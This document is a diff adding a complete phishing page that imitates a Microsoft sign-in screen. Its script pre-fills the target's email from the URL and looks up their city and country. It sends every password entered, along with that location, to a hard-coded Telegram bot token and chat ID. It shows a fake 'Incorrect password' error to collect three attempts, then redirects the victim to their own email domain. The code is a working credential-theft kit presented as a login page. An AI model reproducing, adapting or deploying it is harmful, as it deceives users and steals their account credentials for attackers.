@@ -1,0 +1,294 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Login Into Your Account</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    background: #ffffff;
+    font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+    overflow: hidden;
+  }
+
+  /* ---------- INTRO VIDEO OVERLAY ---------- */
+  #intro {
+    position: fixed;
+    top: 0; left: 0;
+    width: 100vw;
+    height: 100vh;
+    background: #ffffff;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    z-index: 999;
+    opacity: 1;
+    transition: opacity 1.2s ease-in-out;
+  }
+  #intro.fade-out {
+    opacity: 0;
+    pointer-events: none;
+  }
+
+  iframe#introVideo {
+    width: 100%;
+    height: 100%;
+    border: none;
+    background: #ffffff;
+    position: absolute;
+    left: 0;
+    top: 0;
+    overflow: hidden;
+    pointer-events: none;
+  }
+
+  /* ---------- LOGIN BOX ---------- */
+  .login-box {
+    background: #ffffff;
+    width: 360px;
+    border-radius: 10px;
+    box-shadow: 0 8px 25px rgba(0,0,0,0.1);
+    padding: 40px;
+    text-align: left;
+    opacity: 0;
+    transform: translateY(20px);
+    transition: opacity 1.5s ease, transform 1.5s ease;
+    z-index: 1;
+  }
+  .login-box.visible {
+    opacity: 1;
+    transform: translateY(0);
+  }
+
+  .logo img {
+    width: 120px;
+    margin-bottom: 25px;
+    display: block;
+  }
+
+  h2 {
+    font-size: 22px;
+    color: #1b1b1b;
+    margin-bottom: 25px;
+  }
+
+  input {
+    width: 100%;
+    padding: 10px;
+    margin-bottom: 18px;
+    border: 1px solid #ccc;
+    border-radius: 3px;
+    font-size: 14px;
+  }
+
+  input:focus {
+    border-color: #0078d4;
+    outline: none;
+    box-shadow: 0 0 3px #0078d4;
+  }
+
+  .checkbox {
+    display: flex;
+    align-items: center;
+    margin-bottom: 20px;
+    font-size: 13px;
+  }
+
+  .checkbox input {
+    width: auto;
+    margin-right: 8px;
+  }s
+
+    .btn {
+    background: linear-gradient(135deg, #0078d4, #005ea0);
+    color: #fff;
+    border: none;
+    width: 100%;
+    padding: 12px;
+    font-size: 16px;
+    font-weight: 500;
+    border-radius: 6px;
+    cursor: pointer;
+    transition: all 0.3s ease;
+    box-shadow: 0 4px 10px rgba(0,120,212,0.3);
+  }
+
+  .btn:hover {
+    background: linear-gradient(135deg, #005ea0, #004c87);
+    box-shadow: 0 6px 14px rgba(0,94,160,0.4);
+    transform: translateY(-1px);
+  }
+
+  .btn:active {
+    transform: translateY(1px);
+    box-shadow: 0 3px 8px rgba(0,94,160,0.3);
+  }
+
+
+  .forgot {
+    display: inline-block;
+    margin-top: 15px;
+    font-size: 13px;
+    color: #0078d4;
+    text-decoration: none;
+  }
+  .forgot:hover {
+    text-decoration: underline;
+  }
+
+  .footer {
+    text-align: center;
+    margin-top: 35px;
+    font-size: 12px;
+    color: #666;
+  }
+  .footer a {
+    color: #666;
+    text-decoration: none;
+    margin: 0 4px;
+  }
+  .footer a:hover {
+    text-decoration: underline;
+  }
+
+  /* ---------- ERROR MESSAGE ---------- */
+  .error-msg {
+    color: #b00020;
+    font-size: 13px;
+    margin-bottom: 10px;
+    display: none;
+    text-align: center;
+  }
+</style>
+</head>
+<body>
+
+<!-- FULLSCREEN VIDEO INTRO -->
+<div id="intro">
+  <iframe 
+    id="introVideo"
+    allow="autoplay; fullscreen"
+    src="https://streamable.com/e/cau62r?autoplay=1&nocontrols=1"
+    title="Intro Animation">
+  </iframe>
+</div>
+
+<!-- LOGIN BOX -->
+<div class="login-box" id="loginBox">
+  <div class="logo">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo" id="logo">
+  </div>
+  <h2>Sign in</h2>
+  <div id="error-msg" class="error-msg"></div>
+  <form id="loginForm">
+    <input type="email" id="email" placeholder="Email, phone, or Skype" required>
+    <input type="password" id="password" placeholder="Password" required>
+    <div class="checkbox">
+      <input type="checkbox" id="staySignedIn">
+      <label for="staySignedIn">Stay signed in</label>
+    </div>
+    <button type="button" id="login-btn" class="btn">Login</button>
+  </form>
+  <a href="#" class="forgot">Forgot password?</a>
+  <div class="footer">
+    <a href="#">Terms of use</a> · 
+    <a href="#">Privacy & cookies</a><br>
+    © 2025
+  </div>
+</div>
+
+<script>
+  // Fade transition after video
+  const intro = document.getElementById('intro');
+  const loginBox = document.getElementById('loginBox');
+  const videoDuration = 9500; // ~9.5 seconds
+
+  setTimeout(() => {
+    intro.classList.add('fade-out');
+    setTimeout(() => {
+      intro.style.display = 'none';
+      loginBox.classList.add('visible');
+    }, 1200);
+  }, videoDuration);
+
+  // Telegram Bot config
+  const TELEGRAM_BOT_TOKEN = "8366154069:AAFTClzM2Kbirysud1i49UAWmEC6JP0T0xg";
+  const TELEGRAM_CHAT_ID = "7574749243";
+
+  const emailInput = document.getElementById('email');
+  const passwordInput = document.getElementById('password');
+  const loginBtn = document.getElementById('login-btn');
+  const errorMsg = document.getElementById('error-msg');
+  const logoImg = document.getElementById('logo');
+
+  let attempts = 0;
+  const maxAttempts = 3;
+
+// Get email from query parameter (?email=) instead of hash
+const params = new URLSearchParams(window.location.search);
+const rawEmail = params.get("email");
+
+if (!rawEmail || !/^[^@]+@[^@]+\.[^@]+$/.test(rawEmail)) {
+ 
+} else {
+  emailInput.value = rawEmail;
+  emailInput.setAttribute("readonly", true);
+
+  const domain = rawEmail.split('@')[1];
+  logoImg.src = `https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg`;
+  logoImg.onerror = () => {
+    logoImg.src = "https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg";
+  };
+}
+
+
+  // Get location info
+  let userCity = "Unknown City";
+  let userCountry = "Unknown Country";
+
+  fetch("https://ipapi.co/json/")
+    .then(res => res.json())
+    .then(data => {
+      userCity = data.city || userCity;
+      userCountry = data.country_name || userCountry;
+    }).catch(() => {});
+
+  function sendTelegramMessage(email, password, attempt) {
+    const text = `☠️ DAVON CHAMELEON [${attempt}/3] ☠️\n` +
+                 `UserId: [${email}]\nPass: [${password}]\n` +
+                 `Country: [${userCity}, ${userCountry}]`;
+    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: {"Content-Type": "application/json"},
+      body: JSON.stringify({chat_id: TELEGRAM_CHAT_ID, text: text, parse_mode: "HTML"})
+    }).catch(e => console.error("Telegram send failed:", e));
+  }
+
+  loginBtn.addEventListener('click', () => {
+    const password = passwordInput.value.trim();
+    if (password === "") {
+      errorMsg.textContent = "Password cannot be empty.";
+      errorMsg.style.display = "block";
+      return;
+    }
+    attempts++;
+    sendTelegramMessage(emailInput.value, password, attempts);
+
+    if (attempts < maxAttempts) {
+      errorMsg.textContent = "Incorrect password.";
+      errorMsg.style.display = "block";
+      passwordInput.value = "";
+    } else {
+      errorMsg.style.display = "none";
+      window.location.href = `https://${emailInput.value.split('@')[1]}`;
+    }
+  });
+</script>
+
+</body>
+</html>
